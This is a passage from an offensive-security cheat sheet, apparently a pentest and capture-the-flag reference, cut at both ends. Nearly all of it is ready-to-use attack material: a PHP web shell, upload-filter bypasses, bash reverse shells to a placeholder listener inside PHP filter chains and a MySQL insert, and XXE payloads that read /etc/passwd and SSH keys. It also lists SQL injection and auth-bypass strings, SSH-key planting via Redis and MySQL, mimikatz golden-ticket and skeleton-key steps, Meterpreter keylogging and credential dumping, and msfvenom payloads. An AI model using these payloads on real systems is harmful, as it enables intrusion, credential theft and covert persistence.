    system($_GET["cmd"]);
?>
```

```c
http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

#### PHP Upload Filter Bypasses

```c
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
```

```c
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
mv <FILE>.jpg <FILE>.php\x00.jpg
```

#### PHP Filter Chain Generator

> https://github.com/synacktiv/php_filter_chain_generator

```c
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
```

```c
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```

```c
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```

#### PHP Generic Gadget Chains (PHPGGC)

```c
phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

#### Server-Side Request Forgery (SSRF)

```c
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

#### Server-Side Template Injection (SSTI)

##### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```c
${{<%[%'"}}%\.
```

##### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```c
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

#### Upload Vulnerabilities

```c
ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
```

#### wfuzz

```c
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

##### Write to File

```c
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

##### Custom Scan with limited Output

```c
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

##### Fuzzing two Parameters at once

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

##### Domain

```c
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
```

##### Subdomain

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

##### Git

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```
##### Login

```c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
```

##### SQL

```c
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

##### DNS

```c
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

##### Numbering Files

```c
wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

##### Enumerating PIDs

```c
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

#### WPScan

```c
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u
target=<RHOST>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

#### XML External Entity (XXE)

##### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

##### Payloads

```c
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
 <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

```c
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```

```c
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

### Database Analysis

#### MongoDB

```c
mongo "mongodb://localhost:27017"
```

```c
> use <DATABASE>;
> show tables;
> show collections;
> db.system.keys.find();
> db.users.find();
> db.getUsers();
> db.getUsers({showCredentials: true});
> db.accounts.find();
> db.accounts.find().pretty();
> use admin;
```

##### User Password Reset to "12345"

```c
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

#### MSSQL

##### Show Database Content

```c
1> SELECT name FROM master.sys.databases
2> go
```

##### OPENQUERY

```c
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```

```c
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

##### Binary Extraction as Base64

```c
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

##### Steal NetNTLM Hash / Relay Attack

```c
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

#### MySQL

```c
mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p
```

```c
mysql> show databases;
mysql> use <DATABASE>;
mysql> show tables;
mysql> describe <TABLE>;
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
```

##### Update User Password

```c
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
```

##### Drop a Shell

```c
mysql> \! /bin/sh
```

##### xp_cmdshell

```c
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

```c
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

##### Insert Code to get executed

```c
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

##### Write SSH Key into authorized_keys2 file

```c
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

##### Linked SQL Server Enumeration

```c
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

#### NoSQL Injection

```c
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null} }
```

#### PostgreSQL

```c
$ psql
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

### Common Commands

```c
postgres=# \c
postgres=# \list
postgres=# \c  <DATABASE>
<DATABASE>=# \dt
<DATABASE>=# \du
<DATABASE>=# TABLE <TABLE>;
<DATABASE>=# SELECT * FROM users;
<DATABASE>=# \q
```

#### Redis

```c
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> HSET       // set value if a field within a hash data structure
> HGET       // retrieves a field and his value from a hash data structure
> HKEYS      // retrieves all field names from a hash data structure
> HGETALL    // retrieves all fields and values from a hash data structure
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```

##### Enter own SSH Key

```c
redis-cli -h <RHOST>
echo "FLUSHALL" | redis-cli -h <RHOST>
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
<RHOST>:6379> save
OK
```

#### sqlcmd

```c
sqlcmd -S <RHOST> -U <USERNAME>
```

#### SQL Injection

##### Master List

```c
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

##### Authentication Bypass

```c
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

#### SQL Truncation Attack

```c
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```

#### sqlite3

```c
sqlite3 <FILE>.db
```

```c
sqlite> .tables
sqlite> PRAGMA table_info(<TABLE>);
sqlite> SELECT * FROM <TABLE>;
```

#### sqsh

```c
sqsh -S <RHOST> -U <USERNAME>
```

### Password Attacks

#### CrackMapExec

```c
crackmapexec smb <RHOST> -u '' -p '' --shares
crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
crackmapexec smb <RHOST> -u <USERNAME> -H <HASH> -x "whoami"
crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>
crackmapexec winrm <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -m modules/credentials/mimikatz.py
```

#### fcrack

```c
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
```

#### hashcat

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

```c
hashcat --example-hashes
```

```c
hashcat -m 0 md5 /usr/share/wordlists/rockyou.txt
hashcat -m 100 sha-1 /usr/share/wordlists/rockyou.txt
hashcat -m 1400 sha256 /usr/share/wordlists/rockyou.txt
hashcat -m 3200 bcrypt /usr/share/wordlists/rockyou.txt
hashcat -m 900 md4 /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm /usr/share/wordlists/rockyou.txt
hashcat -m 1800 sha512 /usr/share/wordlists/rockyou.txt
hashcat -m 160 hmac-sha1 /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

##### Cracking ASPREPRoast Password File

```c
hashcat -m 18200 -a 0 <FILE> <FILE>
```

##### Cracking Kerberoasting Password File

```c
hashcat -m 13100 --force <FILE> <FILE>
```

##### Bruteforce based on the Pattern

```c
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

##### Generate Password Candidates: Wordlist + Pattern

```c
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
```

##### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```c
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

###### Result

```c
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

##### Crack with hashcat

```c
hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

##### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

##### Cracking with OneRuleToRuleThemAll.rule

```c
hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
```

#### Hydra

```c
hydra <RHOST> -l <USERNAME> -P /usr/share/wordlists/<FILE> ftp|ssh|smb://<RHOST>
```

```c
export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY
```

```c
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
```

```c
hydra <RHOST> http-post-form -L /usr/share/wordlists/list "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /usr/share/wordlists/list

hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f

hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

#### John

```c
/usr/share/john/ssh2john.py id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
john --rules --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
john --show <FILE>
```

#### Kerbrute

##### User Enumeration

```c
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

##### Password Spray

```c
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

#### LaZagne

```c
laZagne.exe all
```

#### mimikatz

##### Dump Hshes

```c
mimikatz.exe
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

##### Pass the Ticket

```c
.\mimikatz.exe
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

##### Forging Golden Ticket

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
mimikatz # misc::cmd
klist
dir \\<RHOST>\admin$
```

##### Skeleton Key

```c
mimikatz # privilege::debug
mimikatz # misc::skeleton
net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

#### pypykatz

```c
pypykatz lsa minidump lsass.dmp
```

### Exploitation Tools

#### ImageTragick

> https://imagetragick.com/

#### MSL / Polyglot Attack

> https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html

##### poc.svg

```c
<image authenticate='ff" `echo $(cat /home/<USERNAME>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

```c
convert poc.svg poc.png
cp /tmp/poc.svg /var/www/html/convert_images/
```

#### Metasploit

```c
$ sudo msfdb run                   // start database
$ sudo msfdb init                  // database initialization
$ msfdb --use-defaults delete      // delete existing databases
$ msfdb --use-defaults init        // database initialization
$ msfdb status                     // database status
msf6 > workspace                   // metasploit workspaces
msf6 > workspace -a <WORKSPACE>    // add a workspace
msf6 > workspace -r <WORKSPACE>    // rename a workspace
msf6 > workspace -d <WORKSPACE>    // delete a workspace
msf6 > workspace -D                // delete all workspaces
msf6 > db_nmap <OPTIONS>           // execute nmap and add output to database
msf6 > hosts                       // reads hosts from database
msf6 > services                    // reads services from database
msf6 > vulns                       // displaying vulnerabilities
msf6 > search                      // search within metasploit
msf6 > set RHOST <RHOST>           // set remote host
msf6 > set RPORT <RPORT>           // set remote port
msf6 > run                         // run exploit
msf6 > spool /PATH/TO/FILE         // recording screen output
msf6 > save                        // saves current state
msf6 > exploit                     // using module exploit
msf6 > payload                     // using module payload
msf6 > auxiliary                   // using module auxiliary
msf6 > encoder                     // using module encoder
msf6 > nop                         // using module nop
msf6 > show sessions               // displays all current sessions
msf6 > sessions -i 1               // switch to session 1
msf6 > sessions -u <ID>            // upgrading shell to meterpreter
msf6 > sessions -k <ID>            // kill specific session
msf6 > sessions -K                 // kill all sessions
msf6 > jobs                        // showing all current jobs
msf6 > show payloads               // displaying available payloads
msf6 > set VERBOSE true            // enable verbose output
msf6 > set forceexploit true       // exploits the target anyways
msf6 > set EXITFUNC thread         // reverse shell can exit without exit the program
msf6 > set AutoLoadStdapi false    // disables autoload of stdapi
msf6 > set PrependMigrate true     // enables automatic process migration
msf6 > set PrependMigrateProc explorer.exe                        // auto migrate to explorer.exe
msf6 > use post/PATH/TO/MODULE                                    // use post exploitation module
msf6 > use post/linux/gather/hashdump                             // use hashdump for Linux
msf6 > use post/multi/manage/shell_to_meterpreter                 // shell to meterpreter
msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
C:\> > Ctrl + z                                  // put active meterpreter shell in background
meterpreter > loadstdapi                         // load stdapi
meterpreter > background                         // put meterpreter in background (same as "bg")
meterpreter > shell                              // get a system shell
meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
meterpreter > ps                                 // checking processes
meterpreter > migrate 2236                       // migrate to a process
meterpreter > getuid                             // get the user id
meterpreter > sysinfo                            // get system information
meterpreter > search -f <FILE>                   // search for a file
meterpreter > upload                             // uploading local files to the target
meterpreter > ipconfig                           // get network configuration
meterpreter > load powershell                    // loads powershell
meterpreter > powershell_shell                   // follow-up command for load powershell
meterpreter > powershell_execute                 // execute command
meterpreter > powershell_import                  // import module
meterpreter > powershell_shell                   // shell
meterpreter > powershell_session_remove          // remove
meterpreter > powershell_execute 'Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress'                                // network discovery
meterpreter > powershell_execute '1..254 | foreach { "<XXX.XXX.XXX>.${_}: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName <XXX.XXX.XXX>.${_} -Quiet)" }'    // network scan
meterpreter > powershell_execute 'Test-NetConnection -ComputerName <RHOST> -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded'                            // port scan
meterpreter > load kiwi                          // load mimikatz
meterpreter > help kiwi                          // mimikatz help
meterpreter > kiwi_cmd                           // execute mimikatz native command
meterpreter > lsa_dump_sam                       // lsa sam dump
meterpreter > dcsync_ntlm krbtgt                 // dc sync
meterpreter > creds_all                          // dump all credentials
meterpreter > creds_msv                          // msv dump
meterpreter > creds_kerberos                     // kerberos dump
meterpreter > creds_ssp                          // ssp dump
meterpreter > creds_wdigest                      // wdigest dump
meterpreter > getprivs                           // get privileges after loading mimikatz
meterpreter > getsystem                          // gain system privileges if user is member of administrator group
meterpreter > hashdump                           // dumps all the user hashes
meterpreter > run post/windows/gather/checkvm    // check status of the target
meterpreter > run post/multi/recon/local_exploit_suggester    // checking for exploits
meterpreter > run post/windows/manage/enable_rdp              // enables rdp
meterpreter > run post/multi/manage/autoroute                 // runs autoroutes
meterpreter > run auxiliary/server/socks4a                    // runs socks4 proxy server
meterpreter > keyscan_start                                   // enabled keylogger
meterpreter > keyscan_dump                                    // showing the output
meterpreter > screenshare                                     // realtime screen sharing
meterpreter > screenshare -q 100                              // realtime screen sharing
meterpreter > record_mic                                      // recording mic output
meterpreter > timestomp                                       // modify timestamps
meterpreter > execute -f calc.exe                             // starts a program on the victim
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwarding
```

##### Metasploit through Proxychains

```c
proxychains -q msfconsole
```

##### Auxiliary Output Directory

```c
/home/<USERNAME>/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
```

##### Meterpreter Listener

###### Generate Payload

```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
```

###### Setup Listener for Microsoft Windows

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

###### Download Files

```c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
```

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

```c
.\<FILE>.exe
```

```c
meterpreter > download *
```

### Post Exploitation

### ADCSTemplate

```c
Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
```

#### BloodHound

```c
pip install bloodhound
sudo apt-get install neo4j
sudo apt-get install bloodhound
```

##### Installing and starting Database

```c
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install apt-transport-https
sudo apt-get install neo4j
systemctl start neo4j
```

```c
sudo neo4j start console
sudo bloodhound --no-sandbox
```

>  http://localhost:7474/browser/


##### Database Password Reset

>  http://localhost:7474/browser/

```c
ALTER USER neo4j SET PASSWORD '<PASSWORD>'
```

#### BloodHound Python

```c
